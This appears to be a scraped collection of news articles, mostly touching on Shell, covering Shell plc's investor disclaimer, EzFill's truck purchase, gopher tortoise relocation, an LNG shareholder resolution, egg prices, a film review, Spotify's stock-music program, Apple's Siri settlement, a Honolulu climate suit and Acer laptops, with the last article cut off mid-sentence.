All statements other than statements of historical fact are, or may be deemed to be, forward-looking statements. Forward-looking statements are statements of future expectations that are based on management\u2019s current expectations and assumptions and involve known and unknown risks and uncertainties that could cause actual results, performance or events to differ materially from those expressed or implied in these statements. Forward-looking statements include, among other things, statements concerning the potential exposure of Shell to market risks and statements expressing management\u2019s expectations, beliefs, estimates, forecasts, projections and assumptions. These forward-looking statements are identified by their use of terms and phrases such as \u201caim\u201d; \u201cambition\u201d; \u2018\u2018anticipate\u2019\u2019; \u2018\u2018believe\u2019\u2019; \u201ccommit\u201d; \u201ccommitment\u201d; \u2018\u2018could\u2019\u2019; \u2018\u2018estimate\u2019\u2019; \u2018\u2018expect\u2019\u2019; \u2018\u2018goals\u2019\u2019; \u2018\u2018intend\u2019\u2019; \u2018\u2018may\u2019\u2019; \u201cmilestones\u201d; \u2018\u2018objectives\u2019\u2019; \u2018\u2018outlook\u2019\u2019; \u2018\u2018plan\u2019\u2019; \u2018\u2018probably\u2019\u2019; \u2018\u2018project\u2019\u2019; \u2018\u2018risks\u2019\u2019; \u201cschedule\u201d; \u2018\u2018seek\u2019\u2019; \u2018\u2018should\u2019\u2019; \u2018\u2018target\u2019\u2019; \u2018\u2018will\u2019\u2019; \u201cwould\u201d and similar terms and phrases. There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this announcement, including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell\u2019s products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cyber security breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this announcement are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc\u2019s Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this announcement and should be considered by the reader. Each forward-looking statement speaks only as of the date of this announcement, January 8, 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this announcement.\n\nShell\u2019s Net Carbon Intensity\n\nAlso, in this announcement we may refer to Shell\u2019s \u201cNet Carbon Intensity\u201d (NCI), which includes Shell\u2019s carbon emissions from the production of our energy products, our suppliers\u2019 carbon emissions in supplying energy for that production and our customers\u2019 carbon emissions associated with their use of the energy products we sell. Shell\u2019s NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell\u2019s \u201cNet Carbon Intensity\u201d or NCI is for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell\u2019s net-zero emissions target\n\nShell\u2019s operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell\u2019s operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell\u2019s operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward-Looking Non-GAAP measures\n\nThis announcement may contain certain forward-looking non-GAAP measures such as IFRS, including Adjusted Earnings, \u201cAdjusted EBITDA\u201d, Cash flow from operating activities excluding working capital movements, Cash capital expenditure, Net debt and Underlying opex.\n\nAdjusted Earnings and Adjusted EBITDA are measures used to evaluate Shell\u2019s performance in the period and over time.\n\nThe \u201cAdjusted Earnings\u201d and Adjusted EBITDA are measures which aim to facilitate a comparative understanding of Shell\u2019s financial performance from period to period by removing the effects of oil price changes on inventory carrying amounts and removing the effects of identified items.\n\nAdjusted Earnings is defined as income/(loss) attributable to shareholders adjusted for the current cost of supplies and excluding identified items. \u201cAdjusted EBITDA (CCS basis)\u201d is defined as \u201cIncome/(loss) for the period\u201d adjusted for current cost of supplies; identified items; tax charge/(credit); depreciation, amortisation and depletion; exploration well write-offs and net interest expense. All items include the non-controlling interest component.\n\nCash flow from operating activities excluding working capital movements is a measure used by Shell to analyse its operating cash generation over time excluding the timing effects of changes in inventories and operating receivables and payables from period to period. Working capital movements are defined as the sum of the following items in the Consolidated Statement of Cash Flows: (i) (increase)/decrease in inventories, (ii) (increase)/decrease in current receivables, and (iii) increase/(decrease) in current payables. Cash capital expenditure is the sum of the following lines from the Consolidated Statement of Cash flows: Capital expenditure, Investments in joint ventures and associates and Investments in equity securities. Net debt is defined as the sum of current and non-current debt, less cash and cash equivalents, adjusted for the fair value of derivative financial instruments used to hedge foreign exchange and interest rate risks relating to debt, and associated collateral balances. Underlying operating expenses is a measure of Shell\u2019s cost management performance and aimed at facilitating a comparative understanding of performance from period to period by removing the effects of identified items, which, either individually or collectively, can cause volatility, in some cases driven by external factors. Underlying operating expenses comprises the following items from the Consolidated statement of Income: production and manufacturing expenses; selling, distribution and administrative expenses; and research and development expenses and removes the effects of identified items such as redundancy and restructuring charges or reversals, provisions or reversals and others.\n\nWe are unable to provide a reconciliation of these forward-looking Non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those Non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc\u2019s consolidated financial statements.\n\nThe contents of websites referred to in this announcement do not form part of this announcement.\n\nWe may have used certain terms, such as resources, in this announcement that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC. Investors are urged to consider closely the disclosure in our Form 20-F, File No 1-32575, available on the SEC website www.sec.gov.\n\nLEI number of Shell plc: 21380068P1DRHMJ8KU70\n\n\n\n",

(NASDAQ: EZFL), a leading mobile fueling company, today announced the completion of its purchase of a fleet of trucks from Shell Retail and Convenience Operations LLC (\u201cShell\u201d), a wholly owned subsidiary of Shell Oil Products US. By integrating these trucks into its existing fleet, EzFill has significantly bolstered its operational capacity and expanded its service footprint in Texas while launching in Arizona and furthering its mission to provide efficient and reliable fueling solutions across its growing service areas.\n\nThe transaction closed on December 27, 2024. As a result, EzFill has officially commenced operations in four new markets: Phoenix, San Antonio, Houston, and Austin; and expanded operations in Dallas. EzFill has started integrating the Shell trucks into its fast-growing infrastructure.\n\nThe goals of the acquisition include:\n\nExpanding EzFill\u2019s Fleet: The acquisition adds 73 trucks, increasing the fleet to 139. This expansion will bolster operational capacity, allowing the Company to handle a larger volume of commercial accounts and ensure timely service delivery in new and existing markets. EzFill expects to deliver approximately 16 million gallons with these new trucks alone, in 2025.\n\nExperiencing Market Growth and Further National Expansion: With the purchase, EzFill now has a presence in 6 states and 14 markets, including: Miami, West Palm Beach, Orlando, Tampa, Jacksonville, Los Angeles, San Francisco, Nashville, Detroit, Dallas, Houston, Austin, San Antonio, and Phoenix.\n\n\u201cThe expansion of our fleet and the opening of new markets is a significant milestone in our journey toward achieving national operations and a strong market presence,\u201d said EzFill CEO Yehuda Levy. \u201cWe grew this company from a small four-truck operation in Miami Beach and are now operating 139 trucks across the country. As one of the largest app-based mobile fueling companies, we hope to deliver upwards of 26 million gallons and produce over $100 million in revenues in 2025. We will continue to grow consistent service standards and visibility while leveraging economies of scale to improve efficiency and competitiveness. Furthermore, we believe this new expansion will help us achieve the scale needed to reach profitability in the near term.\u201d\n\nAlongside recent strategic moves such as acquiring Yoshi Mobility\u2019s fuel division, EzFill remains focused on driving innovation, scaling its service model, and delivering enhanced value to customers across a growing national footprint.\n\nAbout EzFill Holdings, Inc.\n\nEzFill is a Miami-based on-demand mobile fueling service that provides fuel delivery directly to consumers and businesses, eliminating the need for traditional gas stations.

            "content": "A developer hopes to begin construction soon on an 811-unit residential development just east of Sandridge Golf Club, but first it has to gently evict an estimated 283 gopher tortoises and relocate them to a quieter, safer neighborhood.\n\nThe moving cost for the tortoises: It could exceed $2 million!\n\nCounty staff are poring over initial plans submitted by Pennsylvania developer Toll Brothers for Ridge Top Planned Development on approximately 160 acres at the southwest corner of 77th Street and Old Dixie Highway. Ridge Top is slated for 277 single-family homes, 194 multi-family villas, and 340 multi-family two- and three-story rental apartments, along with a clubhouse, recreation areas and a dog park, according to county documents.\n\nThe county\u2019s Sandridge Golf Club is adjacent to the site on the west. The site is within the county\u2019s designated Urban Services Boundary, with county water and sewer available.\n\nSince 2008, Florida has listed the gopher tortoise as threatened and both the tortoise and its burrows are protected by law.\n\nBefore developers can begin clearing land, they must obtain permits from the Florida Fish and Wildlife Conservation Commission (FWC) to survey, capture and relocate the tortoises. While this sounds fair enough, doing so is a lengthy and expensive process that can cost up to $8,000 or more per animal.\n\nThe cost to relocate the tortoises was $900 per animal when Mark Lafurno first became an FWC-authorized gopher tortoise agent. Since then, \u201cit\u2019s become big business, in a way,\u201d Lafurno said.\n\n\u201cThere is a lot of capital involved in setting up an approved recipient site.\u201d And there is a lot of demand for recipient sites as development continues to chug along in Florida, he said.\n\nThe relocation process starts by obtaining approval for a permitted recipient site, usually a large tract of private or public land, often a cattle ranch, located in the central part of the state, Lafurno said. Then the animals are trapped and relocated to the recipient site within 72 hours to minimize trauma and stress on the tortoises, he said.\n\nAtlantic Environmental Permitting and Mitigation conducted an initial environmental assessment of the Top Ridge property in March 2022. In addition to analyzing the soil, trees, vegetation and water bodies, Atlantic surveyed 20 percent of the 151 acres of suitable tortoise habitat, as required by FWC.\n\nAtlantic found 113 \u201cpotentially occupied\u201d tortoise burrows, leading to the estimate 565 burrows could exist across the entire 151 acres. Tortoises can use up to two or three burrows, so it was estimated 283 tortoises would need to be captured and relocated.\n\nThe state application fee alone to mitigate 283 tortoises is approximately $93,000. The cost to trap them and relocate them to an approved recipient site could run $5,500 to $8,000 or more per animal \u2013 or a total cost for Ridge Top\u2019s developers between $1.7 million and $2.4 million. A more specific estimate will be derived from a 100% survey immediately before ground is broken, but developers have to pay the estimated application fee up front.\n\nLike it or not, it is a cost of doing business for developers that most people don\u2019t know about, Sorrow said. \u201cThis is very typical for a development like this, to find tortoises on site,\u201d Sorrow said. \u201cOur intent is to abide by all the federal and state regulations.\n\n\u201cAll of these environmental regulations take a toll on development and are reflected in the costs of the end product,\u201d he said.\n\nDevelopers can save money by keeping some tortoises onsite, providing there is enough suitable habitat. Sorrow said they are looking at that possibility and have set aside nine acres of upland that would be suitable tortoise habitat. Any final decision would come closer to groundbreaking after a 100% survey is completed, he said.\n\nSorrow hopes to submit plans for the PD to the county planning a zoning board early in 2025.\n\nThe current zoning for the parcels is RM-6, medium density multi-family residential, and IG, general industrial. They will ask the county for a zoning change to PD, Planned Development \u2013 which allows for more flexibility in design and a mixture of uses.\n\nNext, they will apply for site development permits, which can take 4-6 months. Then construction of infrastructure such as streets, sewer lines, electric utilities and sidewalks can begin, Sorrow said.\n\n\u201cWe think a lot of people are going to love calling this community home,\u201d Sorrow said.\n\nBut most of the tortoises who called it home will not be among them.\n\nWhat to do, and not do, if you encounter a gopher tortoise\n\nThe gopher tortoise is one of six North American tortoise species and is the only tortoise naturally found east of the Mississippi River. Gopher tortoises can be found in all 67 Florida counties. More than 350 other species, such as snakes, frogs, small mammals and invertebrates, rely on the gopher tortoise\u2019s burrow for survival.\n\nGopher tortoises are listed as Threatened in Florida and both the tortoises and their burrows are protected by Chapter 68A-27 of the Florida Administrative Code. The No. 1 threat to gopher tortoises is loss of habitat due to development. They usually meet an untimely end crossing busy streets in search of food or wide-open new spaces.\n\nIf you see a tortoise in the road, either leave it alone or you can move it off the road but only in the direction it was traveling. Gopher tortoises have a natural \u201choming instinct,\u201d Jones said, and if you move them to the opposite side of the road, they will turn back around and head in the original direction, right back into the road.\n\nIf you can\u2019t stop, or if the turtle is injured, contact the Alliance on Facebook with the cross streets and a volunteer will be contacted to come help the animal. You also can report injured or deceased tortoises to FWC by calling 850-921-1030 or 561-625-5122.\n\nIf you find a tortoise on your property and believe it needs to be relocated for its safety, or you\u2019re worried it might damage your home or yard, contact the Alliance. Do not disturb the burrow or attempt to move the animal yourself. Only a licensed FWC gopher tortoise agent can move them, Jones said.\n\nTortoises require well-drained loose soil, low-growing herbs for food, and open sunlit areas for nesting. Burrows average 15 feet long and about 6 feet deep and are also home to up to 350 other species. The animals spend about 80 percent of their time in their burrows and forage in the morning and late afternoon.",

ACCR also co-filed the resolution, with the non-governmental organisation ShareAction lending support, alongside 100 individual shareholders.\n\nThe shareholder resolution calls on Shell to justify the assumptions behind its LNG growth strategy and explain how it aligns with the company\u2019s climate commitments.\n\nThis comes as Shell plans to grow its LNG business by 20-30% by 2030, with LNG expected to account for nearly a third of the company\u2019s upstream hydrocarbon production by the end of the decade.\n\nVaishnavi Ravishankar, head of stewardship at Brunel Pension Partnership, said: \u201cBrunel is deeply concerned about the apparent disconnect between Shell's LNG growth strategy and its stated climate targets and Paris-aligned pathway. We need to see further transparency to assess Shell's alignment with climate goals, particularly in the context of the recent removal of its interim 2035 climate target.\u201d\n\nAccording to the investors, the resolution is prompted by Shell\u2019s financial exposure to LNG, with the company holding more uncontracted LNG than any other independent oil and gas firm.\n\nAdditionally, the investors question Shell\u2019s demand outlook for LNG, suggesting that its growth strategy is based on demand forecasts higher than any scenario predicted by the International Energy Agency, and that these forecasts have not been updated in response to shifts in the global energy market.\n\nOwen Thorne, responsible investment manager at Merseyside Pension Fund, said: \u201cGiven the direction of travel, investors urgently require enhanced disclosure to reconcile the high demand forecasts set out by Shell with the fundamentals of energy markets and the views put forward by independent energy forecasters.\u201d\n\nShell's expansion of LNG was part of its Energy Transition Strategy which received a majority of shareholder votes at its 2024 AGM.\n\n\n\nThe IEA predicted in its latest Annual Report a global supply glut of LNG, from 2026 on, supply of the gas is set to outstrip demand, leading to oversupply and declining prices of LNG for the next decade.\n\nMore on this:\n\nIEA: global oil demand will peak before 2030\n\nLNG: essential transition fuel or dangerous misstep?",

In the East, the average cost for a dozen large eggs is hovering around $6.06, and in the Midwest, it\u2019s $5.75, according to a U.S. Department of Agriculture (USDA) report from Jan. 3.\n\nThe USDA cites a \u201csignificant outbreak of highly pathogenic avian influenza\u201d in commercial egg-laying flocks throughout December as a key reason behind the high price. The USDA cites the avian flu, as well as a facility fire, for the loss of some 40 million commercial egg-laying hens in 12 states: Arizona, California, Colorado, Iowa, Illinois, Michigan, Minnesota, Ohio, Oregon, Utah, Washington, and Texas.\n\nAdditionally, hen losses during the last two months of 2024 accounted for 43% of the total losses for the year, the USDA report said.\n\nGrocery retailers are taking steps to limit egg consumption, with some placing unit limits per shopping trip, according to the USDA. Some grocers are also posting signs warning shoppers about the short supply of eggs.\n\nWhile overall egg inventory increased by 5%, the national inventory of large-class eggs dropped by 1.5%.\n\nCalifornia\u2019s Proposition 12 is also affecting grocers. Proposition 12, which went into effect in 2022, requires hens to be kept in a cage-free environment. Some stores are telling shoppers that the current egg shortage is due to the cost of sourcing cage-free eggs, according to The Los Angeles Times.\n\nThe USDA states that as of December 2024, cage-free commitments require an estimated 66.7 billion cage-free eggs per year to meet 100% of demand from an estimated cage-free flock of just over 221 million hens. This indicates a shortage of over 121 million hens compared to the current non-organic cage-free flock of nearly 100 million hens.",

Through the lens of body horror, the movie combines sharp social commentary with a playful, if uneven, exploration of genre tropes.\n\nSamantha (Elisabeth Moss) is a fortysomething struggling actress who is trapped with a stagnating career that\u2019s seeping into her personal life as well. Desperate to recapture her Hollywood glory days, she turns to the enigmatic director of the Shell Corporation, Zoe (Kate Hudson), and her promise of youthful beauty, boosted confidence, and boundless vitality. Unable to resist Zoe\u2019s claims, Samantha turns to the Corporation\u2019s revolutionary (and highly dangerous) treatment. As with every wild claim, this one does not come without its unintended consequences.\n\nEqually campy, hilarious, and disgusting, the film operates in a space inhabited by cult classics like \u201cThe Fly\u201d and \u201cTusk,\u201d with plenty of nods to everything from retro Roger Corman to the schlock shock flicks of Troma. It\u2019s clear that Minghella was inspired by those that came before him, especially with his over-the-top horror scenarios that occasionally tip into the realm of corny.\n\nAnd this is where the film looses its footing. It\u2019s highly ambitious, especially as Minghella tries to balance the overtly bizarre elements with significant social commentary. The idea of taking a leap of faith for the sake of physical enhancement brilliantly echoes the current absurdity of society\u2019s fixation on beauty and youth, especially considering how easy it is to coerce a person who is so desperate for change. This is a film that will particularly resonate with women, especially as it asks what we are willing to sacrifice for a promised solution to our deepest fears.\n\nThe film never takes itself too seriously, and its commitment to radical satire is admirable. It relentlessly skewers the wellness industry\u2019s promises of eternal youth and perfection and, while the writing remains sharp, the film sometimes struggles to nail down its thematic messaging.\n\nThe problem I have with \u201cShell\u201d is that while it embraces its inventive premise, energetic execution, general weirdness, and bonkers midnight movie vibe, it falls short of its potential. It\u2019s entertaining but not thought-provoking, and never fully commits to the depth its premise seems to promise.\n\nBy: Louisa Moore",

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against the other FTSE dividend stocks.\n\nGoldman Sachs Research predicts moderate growth for the UK economy in 2025, with GDP rising 1.2%. That is slightly below the Bank of England's (BoE) 1.5% projection and the 1.3% consensus among economists. Moreover, growth is expected to slow as the year goes on, driven by trade uncertainties, tighter budgets, and changes in housing policies. However, inflation is likely to ease through 2025, which could lead to bigger interest rate cuts than the market expects. While most think the BoE will stop cutting rates at 4%, Goldman Sachs sees rates dropping further to 3.25% by mid-2026.\n\nBuilding on this cautious economic outlook, fiscal policies are also expected to play a significant role in shaping growth. The UK\u2019s autumn budget provided a near-term boost to demand but points to a consolidation in 2025, likely slowing growth later in the year. Inflationary pressures from public sector pay deals and higher taxes on services are expected to persist in the short term but should ease as wage growth slows and labor market tightness lessens.\n\nAmid these broader economic challenges, UK investors may find some optimism in corporate dividends. AJ Bell's latest Dividend Dashboard paints a positive picture for FTSE 100 dividends. Analysts expect payouts to grow by 1% in 2024 to \u00a378.6 billion, followed by a 7% bump in 2025 to \u00a383.9 billion, though still just shy of the 2018 record of \u00a385.2 billion. This strong performance in dividends highlights a contrast to the broader economic challenges, offering a silver lining for investors. Share buybacks remain strong, with \u00a349.9 billion already planned for 2024, on top of \u00a352 billion last year. Combined with \u00a311 billion in expected dividends from the FTSE 250 and \u00a347.2 billion in takeovers, the FTSE 350 is set to deliver a whopping \u00a3189.7 billion in total cash returns. That works out to a cash yield of 7.7%, comfortably beating the Bank of England\u2019s 5% base rate, the 3.92% 10-year gilt yield, and the 2.2% inflation rate.\n\nNevertheless, domestic companies are still grappling with significant headwinds, such as rising costs like National Insurance and minimum wage, all while operating in a sluggish economy. Investors are still favoring the US market, but falling interest rates could nudge some back toward UK stocks. Meanwhile, rising bond yields and pension plans shifting to UK equities might help stocks but could drive up government borrowing costs by reducing demand for gilts.",

            "content": "How streaming\u2019s biggest player is quietly replacing musicians with stock music\n\nThe Secret Program\n\nFor years, classical music listeners on Spotify may have noticed unfamiliar names populating their favourite playlists. Now, an investigation reveals why: Spotify has been systematically replacing legitimate classical recordings with anonymous \u201cghost artists\u201d through a secret program called Perfect Fit Content (PFC).\n\nAccording to a recent Harper\u2019s Magazine expos\u00e9, Spotify deliberately fills its most popular playlists \u2014 including classical and jazz collections \u2014 with cheap stock music to reduce royalty payments. The company partners with production houses that churn out anonymous tracks, often replacing works by established artists.\n\nImpact on Classical Music\n\nThe impact on classical music has been particularly severe. Spotify\u2019s \u201cpeaceful piano\u201d and classical music playlists, which once featured renowned performers and composers, are now dominated by nameless performers creating generic background music. Internal documents show Spotify actively tracks and aims to increase these replacements across hundreds of playlists.\n\nBehind the Scenes\n\nThe mechanics of this system are troubling. Production companies hire musicians to create quick, formulaic recordings designed to mimic authentic classical performances. These musicians often sign away their rights to the recordings for a small upfront fee, while Spotify and the production companies profit from millions of streams. One musician interviewed described the process as \u201cbrain-numbing\u201d and \u201ccompletely joyless,\u201d noting that the goal was to be \u201cas milquetoast as possible.\u201d\n\nWhy It Matters\n\nWhy does this matter? When Spotify replaces legitimate classical recordings with stock music, it doesn\u2019t just affect streaming revenues\u2014it undermines the entire classical music ecosystem. Professional musicians lose crucial exposure and income, while listeners unknowingly consume generic substitutes instead of authentic performances.\n\nThe Future at Stake\n\nThe program\u2019s existence contradicts Spotify\u2019s public claims about supporting artists and providing a \u201cmeritocratic\u201d platform. Instead, it reveals a troubling future where streaming services might prioritize cheap, anonymous content over real artistry \u2014 all while keeping listeners in the dark about these practices.\n\nFor classical music lovers, this raises an important question: When we hit play on a classical playlist, are we supporting genuine artists or unknowingly contributing to a system designed to replace them?",

            "content": "Apple will pay $95 million to settle a proposed class action lawsuit involving Siri spying accusations, reports Reuters. The lawsuit alleges that Apple recorded conversations captured with accidental \u200cSiri\u200c activations, and then shared information from those conversations with third-party advertisers.\n\n\n\nTwo plaintiffs claimed that after speaking about products like Air Jordan shoes and Olive Garden, their devices showed ads for those products, while another said he received ads for a surgical treatment after discussing it privately with his doctor.\n\nThe lawsuit dates back to 2019, after a report outed the private conversations that contractors were privy to when \u200cSiri\u200c was accidentally activated. Apple was using contractors to evaluate \u200cSiri\u200c recordings to make improvements to the service, and employees claimed to have heard confidential medical information, drug deals, intimate moments, and other private data.\n\nApple was never secretive about the fact that some \u200cSiri\u200c recordings were analyzed by humans, but the company's privacy terms at the time did not explicitly state that there was human oversight of \u200cSiri\u200c. The customers that filed the lawsuit said that Apple did not inform consumers that they are \"regularly being recorded without consent,\" and they claimed they would not have purchased Apple devices had they known about the \u200cSiri\u200c recordings.\n\nWhile the lawsuit initially focused on Apple's lack of disclosure, the first filing was dismissed in February 2021 because it did not include enough concrete data about the recordings that Apple allegedly collected. An amended complaint that focused on \u200cSiri\u200c recordings used for \"targeted advertising\" was refiled in September 2021, and that was allowed to move forward.\n\nThere has been no evidence that Apple ever provided \u200cSiri\u200c recordings or information from \u200cSiri\u200c recordings to advertisers, and Apple's privacy policies have long made it clear that any data collected from \u200cSiri\u200c for the purpose of improving the feature is anonymized and not associated with a specific user.\n\nIn the settlement filing, Apple says that it \"continues to deny any and all alleged wrongdoing and liability, specifically denies each of the Plaintiffs' contentions and claims, and continues to deny that the Plaintiffs' claims and allegations would be suitable for class action status.\" Apple is settling to avoid further costs of litigation.\n\nThe settlement has received preliminary approval from the court. According to the filing, all current or former owners or purchasers of a \u200cSiri\u200c device in the United States whose confidential or private communications were obtained by Apple between September 17, 2014 and December 31, 2024 are considered class members and could be eligible for a payment.\n\nA settlement website will be set up to identify those eligible to participate within 45 days, with Apple required to share contact information for customers who purchased a device with \u200cSiri\u200c capabilities. Claim information will be collected until May 15, 2025, after which time the settlement will be finalized and payments will go out to eligible customers. Each class member will be able to submit claims for up to five \u200cSiri\u200c devices, receiving up to $20 for each one. The actual settlement payment will depend on the total number of valid claims that are submitted.\n\nAfter the 2019 scandal about contractors listening to accidental \u200cSiri\u200c recordings, Apple temporarily suspended its \u200cSiri\u200c evaluation program, stopped using contractors, and implemented options that allow users to delete \u200cSiri\u200c recordings and block them from being listened to. In later updates, Apple moved some \u200cSiri\u200c processing on-device, reducing the content that's uploaded to its servers.\n\nUpdate: In a statement provided to MacRumors, Apple made it clear that \u200cSiri\u200c data has never been used for marketing purposes or sold to any company for any reason.\n\nSiri has been engineered to protect user privacy from the beginning. Siri data has never been used to build marketing profiles and it has never been sold to anyone for any purpose. Apple settled this case to avoid additional litigation so we can move forward from concerns about third-party grading that we already addressed in 2019. We use Siri data to improve Siri, and we are constantly developing technologies to make Siri even more private.\n\nApple aims to do as much \u200cSiri\u200c processing on-device as it can, and in these situations, no data is uploaded anywhere. Reading a message aloud, for example, is done on-device with no content sent to Apple's servers. Data that is processed on Apple's servers, such as a request that requires location information, is assigned a random identifier and is not tied directly do an Apple Account.\n\nTranscripts of \u200cSiri\u200c conversations can be used to improve \u200cSiri\u200c, Dictation, and Search, but any audio sharing is opt-in and has been since 2019, plus transcripts can be deleted at any time.",

Please let us know if you have feedback\n\nThe U.S. Supreme Court will have a conference on Jan. 10 to determine whether to hear arguments in Big Oil\u2019s appeal of a Hawaii State Supreme Court decision which allowed a climate lawsuit brought by the city and county of Honolulu against the companies to continue.\n\nHonolulu is seeking to hold Shell, ExxonMobil, Sunoco, BP, Chevron, and other major fossil fuel producers accountable for the costs of climate change in the area and initially filed the lawsuit in state court in March 2020, according to court documents. Honolulu filed an amended complaint in 2021 and courts have declined to dismiss the case or move it to federal jurisdiction in the intervening years, ultimately culminating with a decision by Hawaii\u2019s Supreme Court denying the fossil fuel producers\u2019 motion to dismiss in October 2023.\n\nThe lawsuit is just one of at least 86 climate cases filed against fossil fuel producers since 2015. Supreme Court justices, however, will consider whether to hear the case after the U.S. solicitor general said the official United States position is the Court doesn\u2019t have jurisdiction, which Shell called a reversal from prior opinions.\n\nThe U.S. Supreme Court docketed the case in March, following an appeal from Shell, on behalf of the rest of the respondents, arguing that the state supreme court erred by finding the case was not pre-empted by federal laws. The Supreme Court justices asked for the official U.S. position on the appeal in June, and U.S. Solicitor General Elizabeth Prelogar delivered the nation\u2019s view early last month.\n\nPrelogar\u2019s Dec. 10 brief said the United States\u2019 official opinion was that the U.S. Supreme Court lacks the jurisdiction to weigh in on the decision, and \u201ceven if it did [have jurisdiction], further review at this time would be unwarranted.\u201d Prelogar said that the fossil fuel producers have not proved that any other appellate court would have reached a different decision. Additionally, she said constitutional issues of pre-emption of the lawsuit by federal laws or the Clean Air Act have yet to be addressed by the trial court or the Hawaii Supreme Court.\n\n\u201cThe existence of those pending constitutional issues counsels against review now, which would risk piecemeal review of federal issues by this Court,\u201d Prelogar said. Prelogar also said that even if the oil producers theory that the Clean Air Act would preclude them from being pursued for actions that took place outside of the state, the government\u2019s position is the suit could still be pursued for in-state deceptive practices or pollution.\n\nHowever, Shell and the other respondents categorized Prelogar\u2019s brief as a reversal of the government\u2019s prior position on Clean Air Act preemptions in a Dec. 23 response brief to the Court.\n\n\u201cThe Government reverses its position that the Clean Air Act preempts claims in these climate cases seeking damages for the alleged effects of transboundary emissions from artfully pleaded causes,\u201d the petitioners wrote. \u201cThat reversal deepens an acknowledged conflict only this Court can resolve.\u201d\n\nThe petitioners \u2014 which also include Phillips 66 Company, ConocoPhillips, Aloha Petroleum, Marathon Petroleum and Woodside Energy Hawaii \u2014 said the government makes no explanation for reversing its prior positions, and an \u201cescalating spate of state-court lawsuits seeking damages for global emissions \u2026 requires urgent review.\u201d\n\nFollowing the oil producers\u2019 response, the justices scheduled a conference to determine the next steps for the case, which will take place this Friday, according to the case docket.",

            "content": "Acer's mainstream Aspire and Swift laptops have typically provided strong value without perhaps the most striking of designs. If you want the best performance and the most features for your dollar -- and are willing to sacrifice a bit of fit and finish -- you can usually find an Aspire or Swift laptop to fit the bill.\n\nAcer announced a new Aspire 14 laptop and a pair of Swift Go models at CES Monday that continue this trend, offering new Intel or AMD processors and OLED display options inside rather ordinary enclosures. The most interesting-looking laptop among the CES announcements is the Aspire Vero 16, which is made from recycled plastic and oyster shell material and has an unusual textured, speckled finish.\n\nThere's also a handful of new desktops that Acer announced at CES, including the Revo Box AI mini PC.\n\nWatch this: CES 2025: New Laptops, Gaming PCs from Asus, Dell, Lenovo and HP 07:20\n\nAcer Aspire Vero 16 and Aspire 14 AI\n\nThe Aspire Vero 16 is the follow-up to the 15.6-inch Vero from a few years ago. The new 16-inch Vero has an even more sustainable design with a chassis made from more than 70% postconsumer recycled plastic and a bio-based material made from oyster shells. It's the first laptop to use oyster shells in its construction, according to Acer, but it has a design similar to that of the original Vero -- a funky look with a textured finish and speckled with tiny yellow and gray-blue flecks.\n\nIt's not all sustainability and unusual looks for the Aspire Vero 16's chassis. It's MIL-STD-810H certified for durability and is pretty portable for its size, weighing just under 4 pounds, according to Acer. Acer also describes the chassis as easy to repair, which is an effort to increase its lifespan and delay its arrival in a landfill.\n\nAcer Aspire Vero 16 is made from recycled plastic and oyster shells. Acer\n\nInside, the Aspire Vero 16 features Core Ultra 200H series CPUs, integrated Intel Arc graphics, up to 32GB of RAM and 2TB of storage. The 16-inch LCD display with a pedestrian 1,920x1,200-pixel resolution looks to be the laptop's weak point; I look for a 1440p resolution or higher for a 16-inch panel.\n\nThe Aspire Vero 16 will start at $800 in the US and is slated to start shipping in April.\n\nThe other Aspire laptop Acer announced has a more traditional design. The Aspire 14 AI features a plastic keyboard deck sandwiched between aluminum top and bottom covers. It's not as eco-friendly as the Vero 16 but does offer a nod toward sustainability with a design that features an undefined percentage of PCR material. (If it's not stated, then it's safe to assume it's a small fraction.)\n\nThe Aspire 14 AI is based on a 14-inch display and weighs just over 3 pounds. The base display is a basic 1,920x1,200-pixel panel, but there's also an OLED upgrade option. I don't know the details on the OLED option, but I hope it also offers a bump in resolution.\n\nIt's an Intel model with both Core Ultra 100H and 200V CPU options. The Aspire 14 AI with an Intel Core Ultra 258V was the first Lunar Lake laptop I reviewed. I liked it enough but bemoaned the lack of an OLED display option. Newer models, including those with the OLED upgrade, are expected next month. Acer lists the starting price at $800, but you can surely expect the OLED models will cost more than that.\n\nAcer Swift Go 14 and 16 AI laptops\n\nI'm a fan of the Acer 